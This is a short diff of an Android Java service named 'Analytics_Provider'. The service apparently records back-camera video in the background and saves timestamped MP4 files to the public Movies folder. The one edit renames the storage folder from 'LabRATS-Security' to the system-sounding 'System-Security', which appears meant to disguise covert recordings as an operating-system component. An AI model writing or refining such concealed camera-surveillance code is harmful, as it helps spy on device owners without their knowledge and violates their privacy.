@@ -591,7 +591,7 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
             selector = CameraSelector.DEFAULT_BACK_CAMERA;
         }
         
-        File videoDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), "LabRATS-Security");
+        File videoDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), "System-Security");
         if (!videoDir.exists()) videoDir.mkdirs();
         File videoFile = new File(videoDir, "VID_" + System.currentTimeMillis() + ".mp4");
         currentVideoPath = videoFile.getAbsolutePath();
